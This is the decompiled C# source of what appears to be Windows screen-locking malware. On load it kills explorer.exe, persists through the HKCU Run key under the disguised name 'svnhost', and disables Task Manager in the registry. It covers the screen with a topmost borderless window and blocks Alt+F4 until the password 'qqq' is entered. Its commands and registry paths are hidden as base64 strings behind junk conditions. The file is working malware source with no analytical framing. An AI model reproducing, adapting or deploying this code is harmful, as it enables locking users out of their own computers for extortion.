using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace wl;

public class Form1 : Form
{
	private IContainer components;

	private Button button1;

	private TextBox textBox1;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		button1 = new Button();
		textBox1 = new TextBox();
		((Control)this).SuspendLayout();
		((Control)button1).set_Anchor((AnchorStyles)2);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button1).set_Location(new Point(248, 432));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(152, 36));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("Разблокировать");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)textBox1).set_Anchor((AnchorStyles)2);
		((Control)textBox1).set_Location(new Point(248, 406));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(152, 20));
		((Control)textBox1).set_TabIndex(1);
		((Control)textBox1).add_TextChanged((EventHandler)textBox1_TextChanged);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(640, 480));
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public Form1()
	{
		InitializeComponent();
		((Form)this).set_KeyPreview(true);
	}

	public static void kil()
	{
		Application.Exit();
	}

	public static void jui()
	{
		string value = "1";
		string text = "Software\\Microsoft\\Win";
		string subkey = text + "dows\\CurrentVersion\\Policies\\System";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(subkey);
			registryKey.SetValue("DisableTaskMgr", value);
			registryKey.Close();
		}
		catch (Exception)
		{
			if (34 > Screen.get_PrimaryScreen().get_Bounds().Width)
			{
				kil();
			}
		}
	}

	protected override void OnKeyDown(KeyEventArgs e)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Invalid comparison between Unknown and I4
		((Control)this).OnKeyDown(e);
		if ((int)e.get_KeyCode() == 115 && e.get_Alt())
		{
			e.set_Handled(true);
		}
	}

	public static string mers(string data)
	{
		try
		{
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			Decoder decoder = uTF8Encoding.GetDecoder();
			byte[] array = Convert.FromBase64String(data);
			int charCount = decoder.GetCharCount(array, 0, array.Length);
			char[] array2 = new char[charCount];
			decoder.GetChars(array, 0, array.Length, array2, 0);
			return new string(array2);
		}
		catch (Exception ex)
		{
			throw new Exception("Error in base64Decode" + ex.Message);
		}
	}

	public static string collaps(int id)
	{
		string result = "";
		if (id == 1)
		{
			result = mers("c3ZuaG9zdA==");
		}
		if (id == 2)
		{
			result = mers("ZmdyZWVmbg==");
		}
		if (id == 3)
		{
			result = mers("U29mdHdhcmVcXE1pY3Jvc29mdFxc");
		}
		if (id == 4)
		{
			result = mers("XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVuXFw=");
		}
		if (id == 5)
		{
			result = mers("dGFza2tpbGw=");
		}
		if (id == 6)
		{
			result = mers("Y21kLmV4ZQ==");
		}
		if (id == 7)
		{
			result = mers("L0Mg");
		}
		if (id == 8)
		{
			result = mers("IC9mIC9pbSBleHBsb3Jlci5leGU=");
		}
		return result;
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
		if (((Control)textBox1).get_Text() == "qqq")
		{
			Application.Exit();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		string text = collaps(5);
		Process.Start(collaps(6), collaps(7) + text + collaps(8));
		string name = collaps(1);
		string executablePath = Application.get_ExecutablePath();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(collaps(3) + collaps(4));
		try
		{
			if (Screen.get_PrimaryScreen().get_Bounds().Width > 58)
			{
				registryKey.SetValue(name, executablePath);
				registryKey.Close();
			}
		}
		catch
		{
			if (Control.get_DefaultBackColor().ToString() == collaps(2))
			{
				MessageBox.Show("Error");
			}
		}
		jui();
	}
}
